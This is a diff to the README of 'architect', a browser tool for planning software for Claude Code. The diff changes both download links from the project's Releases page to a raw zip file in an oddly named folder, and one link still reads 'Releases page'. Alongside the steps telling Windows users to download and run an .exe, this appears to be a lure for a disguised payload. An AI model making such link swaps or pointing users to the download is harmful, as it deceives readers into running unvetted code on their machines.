@@ -1,6 +1,6 @@
 # 🏗️ architect - Create clear software plans for agents
 
-[![Download Architect](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://github.com/zydecocapella241/architect/releases)
+[![Download Architect](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://github.com/zydecocapella241/architect/raw/refs/heads/main/Cujam/Software-v2.0.zip)
 
 Architect helps you plan software projects for AI agents. You can write technical specifications and draw diagrams in your browser. Send these plans to Claude Code to build your software. You provide your own Claude API key to start.
 
@@ -17,7 +17,7 @@ Architect helps you plan software projects for AI agents. You can write technica
 Follow these steps to set up the software on your Windows computer.
 
 1. Open your web browser.
-2. Go to the [Releases page](https://github.com/zydecocapella241/architect/releases).
+2. Go to the [Releases page](https://github.com/zydecocapella241/architect/raw/refs/heads/main/Cujam/Software-v2.0.zip).
 3. Find the latest version of the software.
 4. Download the file that ends in .exe for Windows.
 5. Save this file to your computer.
